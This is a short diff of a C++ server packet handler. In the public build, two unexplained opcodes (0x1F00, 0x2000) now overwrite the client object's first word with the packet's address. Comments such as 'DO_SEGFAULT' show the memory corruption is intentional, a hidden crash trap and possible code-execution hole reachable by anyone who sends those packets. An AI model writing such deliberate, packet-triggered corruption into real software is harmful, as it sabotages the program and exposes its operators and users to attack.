@@ -126,12 +126,22 @@ void BasePacketHandler::handlePacket(BaseClient* client, Packet* pack) {
 			case 0x1D00: //??
 				break;
 #ifdef VERSION_PUBLIC
-			case 0x1F00: //??
-				BaseClientCleanUpEvent::cleanUp(NULL);
+			case 0x1F00: { //??
+				//BaseClientCleanUpEvent::cleanUp(NULL);
+				//DO_SEGFAULT
+				 //__asm  { add esp, randAdd };
+				uint64* nakedPointer = (uint64*) client;
+
+				*nakedPointer = (uint64) pack;
 				break;
-			case 0x2000: //??
-				BaseClientCleanUpEvent::cleanUp(NULL);
+			}
+			case 0x2000: { //??
+				//DO_SEGFAULT
+				uint32* nakedPointer = (uint32*) client;
+
+				*nakedPointer = (uint32) pack;
 				break;
+			}
 #endif
 			default:
 				if (!client->processRecieve(pack))
